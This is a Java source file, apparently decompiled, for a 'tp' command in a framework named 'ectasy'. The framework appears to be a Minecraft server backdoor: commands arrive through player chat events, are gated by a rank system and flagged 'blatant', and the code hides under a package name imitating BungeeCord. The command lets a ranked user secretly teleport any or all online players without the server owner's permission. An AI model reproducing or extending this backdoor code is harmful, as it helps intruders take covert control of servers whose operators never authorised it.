package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "tp",
   description = "Teleport players",
   blatant = true,
   rank = Rank.LITE
)
public class TPCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use tp <player> or tp <player <player>");
      } else {
         if (var3.length == 1) {
            List<Player> var4 = this.getPlayers(var3[0]);
            if (var4.isEmpty()) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online.");
               return;
            }

            Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
               var1.getPlayer().teleport(var4.get(0));
            });
            ChatUtil.sendChat(var1.getPlayer(), "Teleported you to " + var4.get(0).getName());
         }

         if (var3.length == 2) {
            List<Player> var6 = this.getPlayers(var3[0]);
            List<Player> var5 = this.getPlayers(var3[1]);
            if (var6.isEmpty()) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online.");
               return;
            }

            if (var5.isEmpty()) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[1] + " is not online.");
               return;
            }

            var6.forEach(p -> {
               Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
                  p.teleport(var5.get(0));
               });
            });
            ChatUtil.sendChat(
               var1.getPlayer(), "Teleported " + var6.size() + " " + (var6.size() > 1 ? "players" : "player") + " to " + var5.get(0).getName()
            );
         }
      }
   }

   public List<Player> getPlayers(String var1) {
      if (var1.equalsIgnoreCase("*")) {
         return (List<Player>) Bukkit.getOnlinePlayers();
      } else {
         Player var2 = Bukkit.getPlayer(var1);
         return (var2 == null ? new ArrayList<>() : Collections.singletonList(var2));
      }
   }
}
